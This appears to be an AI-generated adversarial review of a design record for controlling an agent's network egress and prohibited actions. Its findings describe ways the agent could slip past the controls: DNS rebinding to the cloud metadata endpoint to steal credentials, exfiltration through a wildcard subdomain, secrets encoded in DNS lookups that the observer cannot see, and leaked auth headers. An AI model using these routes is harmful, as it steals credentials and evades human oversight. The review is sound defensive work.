# ADR 0003 design panel: anthropic/claude-opus-4.1

_finish=stop seconds=152.5 cost=$0.4190 usage={'prompt_tokens': 18847, 'completion_tokens': 1817, 'total_tokens': 20664, 'cost': 0.41898, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.41898, 'upstream_inference_prompt_cost': 0.282705, 'upstream_inference_completions_cost': 0.136275}, 'completion_tokens_details': {'reasoning_tokens': 0, 'image_tokens': 0, 'audio_tokens': 0}}_

## Adversarial Review of ADR 0003

### Findings

**F1: EGRESS_ALLOWLIST_DNS_REBIND**
- **ID:** F1 / **TITLE:** DNS Rebinding Bypasses Allowlist / **SEVERITY:** HIGH
- **LAYER:** A egress
- **SCENARIO:** Proposer requests `net.get:safe-docs.example.com`. Between approval and execution, attacker controls DNS to rebind `safe-docs.example.com` → `169.254.169.254` (AWS metadata endpoint). The mediated client resolves at execution time and exfiltrates credentials.
- **WHY IT BREAKS:** The allowlist check happens on the hostname string, but the actual connection uses the resolved IP at execution time. This creates a TOCTOU gap where an approved "safe" domain becomes a metadata endpoint.
- **ADR SCOPES IT:** No - the ADR doesn't address DNS resolution timing.
- **FIX:** Pin DNS resolution at approval time, or allowlist by IP ranges not hostnames.

**F2: PROHIBITION_RECOGNIZER_DETERMINISM**
- **ID:** F2 / **TITLE:** Deterministic Recognizer Cannot Recognize Offense / **SEVERITY:** CRITICAL
- **LAYER:** B prohibition
- **SCENARIO:** A proposer crafts `run_command("curl -X POST https://api.example.com/v1/users -d 'name=test'")`. Is this legitimate API testing or unauthorized access? A deterministic recognizer checking "destination + intent shape" cannot know without context about api.example.com's ownership.
- **WHY IT BREAKS:** The ADR insists on deterministic recognition (not an LLM classifier) to avoid P-01 violation, but infiltration/offense is fundamentally context-dependent. A pattern-based recognizer will have massive false negatives (real attacks it passes) AND false positives (legitimate testing it blocks).
- **ADR SCOPES IT:** Partially - admits "deliberately conservative" coverage but doesn't acknowledge the fundamental impossibility.
- **FIX:** Either accept LLM classification with careful P-01 boundary design, or scope prohibition to only the most unambiguous patterns (e.g., known exploit payloads).

**F3: EGRESS_WILDCARD_SUBDOMAIN**
- **ID:** F3 / **TITLE:** Wildcard Grants Widen Attack Surface / **SEVERITY:** MEDIUM
- **LAYER:** A egress
- **SCENARIO:** Operator grants `net.get:*.github.com` thinking it's safe. Attacker registers `exfiltrate.github.com` as a GitHub Pages site, proposer sends data there via GET query parameters.
- **WHY IT BREAKS:** The ADR says `<dest>` is "a host/domain" but doesn't specify wildcard handling. If wildcards are allowed for convenience, they create unintended attack surface.
- **ADR SCOPES IT:** No - wildcard behavior unspecified.
- **FIX:** Explicitly forbid wildcards, or enumerate allowed subdomains at grant time.

**F4: SAME_CHANNEL_OBSERVER_BYPASS**
- **ID:** F4 / **TITLE:** Same-Channel Observer Blind to Side Channels / **SEVERITY:** MEDIUM
- **LAYER:** A egress
- **SCENARIO:** The mediated client logs the HTTP request/response, but the proposer exfiltrates via DNS lookups embedded in the hostname: `net.get:secret-is-[base64].safe-docs.com`. The DNS query happens before the HTTP request and isn't captured by the urllib-based observer.
- **WHY IT BREAKS:** The "one mediated client that is ALSO the observer" only sees what urllib sees. DNS resolution, timing channels, and failed-connection attempts may leak information without appearing in the HTTP-level observation.
- **ADR SCOPES IT:** Yes - explicitly states this is a "stated weakness" and names independent observation as a revisit trigger.
- **FIX:** Already scoped as future work (network namespace/proxy).

**F5: GET_SIDE_EFFECTS_VIA_CACHE_BUST**
- **ID:** F5 / **TITLE:** GET Requests Can Have Side Effects / **SEVERITY:** LOW
- **LAYER:** A egress
- **SCENARIO:** Proposer issues `net.get:analytics.example.com/track?event=user_clicked&timestamp=[unique]`. While idempotent in HTTP terms, this GET request logs an event on the server, effectively exfiltrating activity patterns.
- **WHY IT BREAKS:** The ADR assumes "GET/HEAD (no third-party side effect)" but many real services use GET for lightweight state changes, analytics, and tracking.
- **ADR SCOPES IT:** Implicitly - the method split acknowledges this is why POST is stricter.
- **FIX:** Document that GET may still leak information via access logs and query parameters.

**F6: PROHIBITION_ABOVE_GATE_ORDERING**
- **ID:** F6 / **TITLE:** Prohibition Check Order Creates Inconsistency / **SEVERITY:** LOW
- **LAYER:** B prohibition / coherence
- **SCENARIO:** The ADR says prohibition sits "above the capability gate" but the implementation sketch shows it in the same `governance.py` flow. If `is_prohibited()` runs AFTER workspace resolution, a path-escaping infiltration attempt could error before being logged as prohibited.
- **WHY IT BREAKS:** The prohibition's audit trail depends on it firing before other denies. Wrong ordering means some prohibited attempts won't be recorded as such.
- **ADR SCOPES IT:** No - implementation order not specified precisely.
- **FIX:** Explicitly check prohibition FIRST, before any other validation.

### Missing

**M1: REDIRECT_FOLLOWING** - The ADR doesn't specify whether HTTP redirects are followed. If they are, a redirect from an allowlisted host to a non-allowlisted host bypasses the control. Must specify: either don't follow redirects, or validate each hop against the allowlist.

**M2: REQUEST_SIZE_LIMITS** - No mention of request body size limits for POST or response size limits for GET. A proposer could DoS by requesting massive files or posting huge payloads. Needs explicit byte limits.

**M3: SECRETS_IN_HEADERS** - The ADR doesn't address authentication headers or cookies. A proposer could craft requests that include `Authorization: Bearer [token]` headers, leaking credentials. Need to sanitize or forbid auth headers.

### Decomposition Judgment

The two-layer split (grantable authority / un-grantable prohibition) is **conceptually sound but practically problematic**. The distinction holds abstractly — some actions truly cannot be authorized by the operator alone. However, the implementation collapses because recognizing "offense" deterministically is impossible without context the agent lacks. The better frame would be: "technically-constrained capabilities" (Layer A) and "legally/ethically-constrained capabilities requiring external attestation" (Layer B with explicit external proof requirements).

### Steelman

The design correctly identifies that egress needs default-deny allowlisting and that some actions require legitimacy from outside the trust domain. The staging model for new destinations mirrors the proven controlled-location pattern elegantly. The same-channel observer weakness is honestly acknowledged with a clear upgrade path.

### Verdict

**SERIOUS_FLAWS** - The prohibition recognizer's fundamental impossibility (F2) makes Layer B unimplementable as specified.

**Single highest-value change:** Replace the deterministic prohibition recognizer with an explicit "external attestation required" model where certain patterns trigger a requirement for out-of-band proof (signed pentest agreement, CTF registration, etc.) rather than trying to recognize "offense" from the action alone.
